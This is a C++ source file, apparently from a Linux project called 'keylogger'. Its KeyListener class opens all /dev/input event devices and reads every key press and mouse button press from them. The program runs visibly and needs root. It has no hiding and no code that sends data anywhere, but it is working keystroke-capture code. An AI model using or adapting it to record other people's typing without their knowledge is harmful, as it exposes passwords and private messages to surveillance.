
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <filesystem>
#include <iostream>


#include "KeyListener.hpp"


keylogger::KeyListener::KeyListener(KeyDecoder& decoder) : m_keyDecoder(decoder)
{}

void keylogger::KeyListener::Run()
{
    try
    {
        // InputLogger logger("input_log.log");
        // std::vector<pollfd> poll_fds;

        // Find and open all input devices
        for (const auto &entry : std::filesystem::directory_iterator("/dev/input"))
        {
            std::string path = entry.path();
            if (IsInputDevice(path))
            {
                int fd = open(path.c_str(), O_RDONLY | O_NONBLOCK);
                if (fd != -1)
                {
                    m_fds.push_back({fd, POLLIN, 0});

                    // Get device name for debugging
                    char name[256] = "Unknown";
                    ioctl(fd, EVIOCGNAME(sizeof(name)), name);
                    std::cout << "Monitoring device: " << path << " (" << name << ")" << std::endl;
                }
            }
        }

        if (m_fds.empty())
        {
            std::cerr << "No input devices found! Possible reasons:" << std::endl;
            std::cerr << "1. Program needs to run as root (try 'sudo ./keylogger')" << std::endl;
            std::cerr << "2. No keyboard/mouse devices connected" << std::endl;
            std::cerr << "3. Check /dev/input/ directory exists" << std::endl;
            return;
        }

        std::cout << "Input logger active. Press Ctrl+C to stop." << std::endl;

        // Main event loop
        input_event ev;

        //How to leave while loop?
        while (true)
        {
            int ret = poll(m_fds.data(), m_fds.size(), -1);
            if (ret > 0)
            {
                for (auto &pfd : m_fds)
                {
                    if (pfd.revents & POLLIN)
                    {
                        while (read(pfd.fd, &ev, sizeof(ev)) == sizeof(ev))
                        {
                            if (ev.type == EV_KEY)
                            {
                                // Check if it's a mouse button (BTN_* codes)
                                if (ev.code >= BTN_MOUSE && ev.code <= BTN_JOYSTICK)
                                {
                                    m_keyDecoder.ProcessMouseEvent(ev.code, ev.value);
                                }
                                else
                                {
                                    m_keyDecoder.ProcessKeyEvent(ev.code, ev.value);
                                }
                            }
                        }
                    }
                }
            }
        }

        // Close all file descriptors
        for (auto &pfd : m_fds)
        {
            close(pfd.fd);
        }

    }
    catch (const std::exception &e)
    {
        std::cerr << "Error: " << e.what() << std::endl;
    }
}

bool keylogger::KeyListener::IsInputDevice(const std::string& device_path)
{
    // Check if it's an event device
    if (device_path.find("event") == std::string::npos)
    {
        return false;
    }

    // Try to open the device to check if it's accessible
    const int fd = open(device_path.c_str(), O_RDONLY | O_NONBLOCK);
    if (fd == -1)
    {
        return false;
    }

    // Get device capabilities to determine if it's a keyboard or mouse
    unsigned long evbit = 0;
    ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);
    close(fd);

    // Check if device has key or button events
    return (evbit & (1 << EV_KEY)) != 0;
}